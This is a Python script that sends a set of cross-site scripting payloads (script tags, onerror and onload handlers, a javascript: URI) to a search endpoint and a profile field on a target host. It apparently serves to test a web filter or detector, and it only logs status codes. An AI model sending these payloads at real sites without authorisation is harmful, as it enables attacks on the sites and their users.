"""Cross-site scripting (XSS) attacks."""

import sys
import urllib.request
import urllib.parse
import urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = sys.argv[2] if len(sys.argv) > 2 else "80"
BASE = f"http://{TARGET}:{PORT}"

def req(method, path, body=None, headers=None):
    url = f"{BASE}{path}"
    data = urllib.parse.urlencode(body).encode() if body else None
    hdrs = headers or {}
    hdrs.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=5)
        print(f"  {method:4s} {path:35s} -> {resp.status}")
    except urllib.error.HTTPError as e:
        print(f"  {method:4s} {path:35s} -> {e.code}")

print(f"\n── XSS attacks ── target={TARGET}:{PORT}\n")

req("GET", '/search?q=' + urllib.parse.quote("<script>alert('xss')</script>"))
req("POST", "/api/v2/user/profile", {"email": "xss@test.com", "bio": "<img src=x onerror=alert(1)>"})
req("GET", '/search?q=' + urllib.parse.quote("<script>document.cookie</script>"))
req("GET", '/search?q=' + urllib.parse.quote("<ScRiPt>alert(1)</ScRiPt>"))
req("GET", '/search?q=' + urllib.parse.quote("<img src=x onerror=alert('XSS')>"))
req("GET", '/search?q=' + urllib.parse.quote("<body onload=alert(1)>"))
req("GET", '/search?q=' + urllib.parse.quote("javascript:alert(1)"))

print("\nDone.")
